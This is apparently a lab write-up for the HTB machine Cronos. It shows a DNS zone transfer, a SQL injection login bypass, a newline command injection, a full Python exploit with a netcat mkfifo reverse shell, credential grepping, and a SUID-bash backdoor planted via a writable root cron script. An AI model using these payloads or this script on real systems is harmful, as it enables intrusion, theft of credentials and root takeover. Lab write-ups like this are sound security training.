---
title: 'HTB Cronos - Medium'
date: 2024-05-28 00:00:00 +0000
categories: [HTB Machines]
tags: [Medium, Linux, HTB]
---

**Cronos** is a medium HTB machine that begins with a **DNS Zone Transfer (AXFR)** to discover a virtual host subdomain. Subsequently, one must exploit a **SQL injection vulnerability** to bypass the web server’s authentication and a **command injection** to gain RCE. Root-level access to the machine is achievable by **abusing a cron job with weak permissions** running as root.

<img src="/assets/img/cronos/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.227.211

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.227.211 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 53, 80

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.227.211 -sVC -p22,53,80

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 11:36 WEST
Nmap scan report for 10.129.227.211
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.38 seconds

[+] Script finished successfully
```

A default web page received us on port TCP/80.

<img src="/assets/img/cronos/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Discovered a new subdomain via DNS Zone Transfer (AXFR).

```bash
dig axfr cronos.htb @10.129.227.211
; <<>> DiG 9.19.21-1-Debian <<>> axfr cronos.htb @10.129.227.211
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 59 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (TCP)
;; WHEN: Tue May 28 11:41:11 WEST 2024
;; XFR size: 7 records (messages 1, bytes 203)

for sub in $(cat subdomains.txt); do dig axfr $sub @10.129.227.211; done
; <<>> DiG 9.19.21-1-Debian <<>> axfr admin.cronos.htb @10.129.227.211
;; global options: +cmd
; Transfer failed.

; <<>> DiG 9.19.21-1-Debian <<>> axfr ns1.cronos.htb @10.129.227.211
;; global options: +cmd
; Transfer failed.
```

Appended the newly discovered domain and vHost subdomain to /etc/hosts.

```bash
echo -e "10.129.227.211\tcronos.htb admin.cronos.htb" | sudo tee -a /etc/hosts
10.129.227.211  cronos.htb admin.cronos.htb
```

A login portal received us in admin.cronos.htb.

<img src="/assets/img/cronos/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

# Exploitation

Let’s try a simple SQL injection.

```
1' or 1337>0-- -
```

<img src="/assets/img/cronos/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

We are in! The page offers a networking functionality based on user input, sounds a good idea XD.

<img src="/assets/img/cronos/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

<img src="/assets/img/cronos/Untitled 5.png" alt="Untitled 5.png" style="width:600px;">

A POST request is sent to the server, but we got no output. Let’s try a different approach.

<img src="/assets/img/cronos/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

Switching to the ‘ping’ mode shows a potential way to exfiltrate data.

<img src="/assets/img/cronos/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">

Successfully achieved RCE as www-data by exploiting a command injection vulnerability.

```
command=ping+-c+1&host=127.0.0.1%0awhoami
```

<img src="/assets/img/cronos/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">

For learning’s sake, I created a Python script that recreates our steps.

```python
import argparse
import requests
import sys

def bypass_login(target, ):
    url = f'http://{target}'
    headers = {
        'Host': 'admin.cronos.htb',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = 'username=a%27+or+1%3D1--+-&password=a'

    s = requests.session()
    res = s.post(url, headers=headers, data=data, allow_redirects=False)
    if res.status_code == 302:
        print("\n[+] Bypassed the authentication")
        return s
    else:
        raise Exception('\n[!] Error: Could NOT bypass the authentication :(')

def inject_command(target, command, s):
    headers = {
        'Host': 'admin.cronos.htb',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    url = f'http://{target}/welcome.php'
    data = f'command=ping+-c+1&host=127.0.0.1%0a{command}'
    
    response = s.post(url, headers=headers, data=data, timeout=3)
    
    # format output (don't critize my code XD)
    list_from_output = response.text.split('\n')
    previous_line = ''.join(list(filter(lambda x: 'rtt min/avg/max/mdev' in x, list_from_output)))
    start_index = list_from_output.index(previous_line) + 1
    command_output = '\n'.join(map(lambda x: x.strip(), list_from_output[start_index:-5])).replace('<br>', '')
    
    print(f'\n[+] Command injected: {command}')
    print(f'\n[+] Output:\n\n{command_output}')
    
def send_revshell(lhost, lport, target, s):
    try:
        command = f'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20{lhost}%20{lport}%20%3E%2Ftmp%2Ff'
        inject_command(target, command, s)

        raise Exception("[!] Error: Could NOT establish a reverse shell :(")

    except requests.Timeout:
        print("\n[+] Check your Netcat listener :D")

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB Cronos exploit"
    )
    parser.add_argument('-t', '--target', dest='target', required=True)
    parser.add_argument('-m','--mode', dest='mode', choices=['c', 'r'], required=True)
    parser.add_argument('--command', dest='command')
    parser.add_argument('--lhost', dest='lhost')
    parser.add_argument('--lport', dest='lport', default=4444, type=int)
    
    return parser.parse_args()

def main():
    try:
        args = set_arguments()

        # bypass auth
        session = bypass_login(args.target)

        # reverse shell mode
        if args.mode == 'r':
            send_revshell(args.lhost, args.lport, args.target, session)

        # command injection mode
        elif args.mode == 'c':
            inject_command(args.target, args.command, session)

        sys.exit(0)

    except KeyboardInterrupt:
        print("\n[!] Keyboard interrumpt detected. Quitting!")
        sys.exit(1)
    
    except Exception as e:
        print(e)
        sys.exit(1)
        
main()
```

**Note**: I tried the script in a fresh machine and it worked fine. Remember to update /etc/hosts :).

We can execute commands using the `-m c --command <command>` flags.

```bash
python3 cronos.py -t 10.129.227.211 -m c --command "whoami" 

[+] Bypassed the authentication

[+] Command injected: whoami

[+] Output:

www-data
```

Found a database password in the source files.

```bash
python3 cronos.py -t 10.129.227.211 -m c --command "cat * | grep -i pass"

[+] Bypassed the authentication

[+] Command injected: cat * | grep -i pass

[+] Output:

define('DB_PASSWORD', '<REDACTED>');
$db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
// username and password sent from form
$mypassword = md5($_POST['password']);
...
```

Started a Netcat listener `nc -nlvp 4444` and sent a reverse shell using the `-m r` mode.

```bash
python3 cronos.py -t 10.129.227.211 -m r --lhost 10.10.14.42

[+] Bypassed the authentication

[+] Check your Netcat listener :D
```

Received a reverse connection and transformed the shell into a pseudo-interactive TTY with Python.

```bash
www-data@cronos:/var/www/admin$ whoami
www-data

www-data@cronos:/var/www/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# PrivEsc

There is another user called ‘noulis’.

```bash
www-data@cronos:/var/www/admin$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
```

We have read access to the user’s home directory, so let’s read the flag.

```bash
www-data@cronos:/var/www/admin$ ls -lah /home/noulis
total 32K
drwxr-xr-x 4 noulis noulis 4.0K May 10  2022 .
drwxr-xr-x 3 root   root   4.0K May 10  2022 ..
-rw-r--r-- 1 noulis noulis  220 Mar 22  2017 .bash_logout
-rw-r--r-- 1 noulis noulis 3.7K Mar 22  2017 .bashrc
drwx------ 2 noulis noulis 4.0K May 10  2022 .cache
drwxr-xr-x 3 root   root   4.0K May 10  2022 .composer
-rw-r--r-- 1 noulis noulis  655 Mar 22  2017 .profile
-r--r--r-- 1 noulis noulis   33 May 28 15:13 user.txt

www-data@cronos:/var/www/admin$ cat /home/noulis/user.txt
2cc686d348a538c7****************
```

The obtained password from config.php can be used to connect to the MySQL server.

```sql
www-data@cronos:/var/www/admin$ mysql -u admin -p'<REDACTED>' -h localhost
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)

mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
```

The admin password appears to belong to the web server. We bypassed the authentication step so it’s irrelevant for us.

```sql
mysql> describe users;
+----------+-----------------+------+-----+---------+----------------+
| Field    | Type            | Null | Key | Default | Extra          |
+----------+-----------------+------+-----+---------+----------------+
| id       | int(6) unsigned | NO   | PRI | NULL    | auto_increment |
| username | varchar(30)     | NO   |     | NULL    |                |
| password | varchar(100)    | NO   |     | NULL    |                |
+----------+-----------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | <REDACTED>                       |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

There is a cronjob running as root under the /var/www directory, which is our home’s folder.

```bash
www-data@cronos:/var/www/admin$ crontab -l
no crontab for www-data

www-data@cronos:/var/www/admin$ cat /etc/crontab 
* * * * *    root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

We have full access to the cron job script. This should be easy.

```bash
www-data@cronos:/var/www/admin$ ls -l /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

Replaced the script to create a backdoor.

```bash
www-data@cronos:/var/www/admin$ echo -e '<?php system("/bin/chmod +s /bin/bash") ?>' > /var/www/laravel/artisan
```

Successfully escalated to root and read the final flag. GGs!

```
www-data@cronos:/var/www/admin$ bash -p
bash-4.3# whoami
root

bash-4.3# cat /root/root.txt
d8b0977dd8a20348****************
```